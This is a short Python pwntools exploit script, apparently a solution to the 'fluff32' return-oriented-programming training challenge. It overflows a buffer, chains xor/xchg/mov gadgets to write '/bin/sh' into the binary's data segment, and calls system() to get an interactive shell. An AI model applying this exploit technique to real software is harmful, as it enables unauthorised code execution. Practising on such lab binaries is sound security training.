from pwn import *

'''
0x08048430    1 6            sym.imp.system
08048430 <system@plt>:
 8048430:	ff 25 18 a0 04 08    	jmp    *0x804a018
 8048436:	68 18 00 00 00       	push   $0x18
 804843b:	e9 b0 ff ff ff       	jmp    80483f0 <.plt>

25 0x00001028     8 0x0804a028     8 -rw- .data


'''

def write(data,address):	 
#write to ecx
	rop = p32(0x08048671) #: xor edx, edx; pop esi; mov ebp, 0xcafebabe; ret; 
	rop += 'dump' #dummy to pop esi 
	rop += p32(0x080483e1) #: pop ebx; ret;
	rop += p32(address) #address that pointing the string  
	rop += p32(0x0804867b) #: xor edx, ebx; pop ebp; mov edi, 0xdeadbabe; ret; 
	rop += 'dump' #dummy to pop ebp
	rop += p32(0x08048689) #: xchg edx, ecx; pop ebp; mov edx, 0xdefaced0; ret; 
	rop += 'dump' #dummy pop ebp

#write to edx
	rop += p32(0x08048671) #: xor edx, edx; pop esi; mov ebp, 0xcafebabe; ret; 
	rop += 'dump' #dummy to pop esi
	rop += p32(0x080483e1) #: pop ebx; ret;
	rop += data 
	rop += p32(0x0804867b) #: xor edx, ebx; pop ebp; mov edi, 0xdeadbabe; ret; 
	rop += 'dump' #dummy to pop ebp

#final gadget ecx,edx
	rop += p32(0x08048693) #: mov dword ptr [ecx], edx; pop ebp; pop ebx; xor byte ptr [ecx], bl; ret;
	rop += 'dump' 
	rop += p32(0)
	
	return rop

def main():
	system_plt = 0x08048430
	data_segment = 0x0804a028

	payload = 'A' * 44
	payload += write('/bin',data_segment)
	payload += write('/sh\x00',data_segment + 4)

	#call system
	payload += p32(system_plt)
	payload += 'dump'
	payload += p32(data_segment)

	p = process('./fluff32')
	print p.recvrepeat(0.2)
	p.sendline(payload)
	p.interactive()

if __name__ == '__main__':
	main()
